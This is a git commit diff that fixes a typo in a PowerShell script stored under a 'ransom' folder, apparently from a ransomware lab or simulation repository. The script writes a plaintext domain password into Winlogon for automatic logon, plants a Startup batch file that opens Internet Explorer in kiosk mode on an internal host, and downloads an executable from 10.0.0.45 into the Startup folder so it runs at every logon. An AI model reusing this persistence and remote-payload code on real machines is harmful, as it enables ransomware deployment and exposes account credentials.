0691102dac92ee9c5737294634156ed1d93b3c38
6903-EthicalHacker <44905220+6903-EthicalHacker@users.noreply.github.com>
2018-11-29 01:49:18 -0800

    Fixing typo

--- ransom/windows/service_workstation.ps1
+++ ransom/windows/service_workstation.ps1
@@ -5,7 +5,7 @@ $DomainUser = $DomainName + "\" + $DefaultUsername
 
 $RegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 Set-ItemProperty $RegPath "AutoAdminLogon" -Value "1" -type String 
-Set-ItemProperty $RegPath "DomainUsername" -Value "$DomainUser" -type String 
+Set-ItemProperty $RegPath "DefaultUsername" -Value "$DomainUser" -type String 
 Set-ItemProperty $RegPath "DefaultPassword" -Value "$DefaultPassword" -type String
 New-Item -Path 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup' -Name smbsvcs.bat -Value """C:\Program Files\Internet Explorer\iexplore.exe"" -k ""http://10.0.0.45"""
 wget 10.0.0.45:443/sysx86.exe -O 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\sysx86.exe'
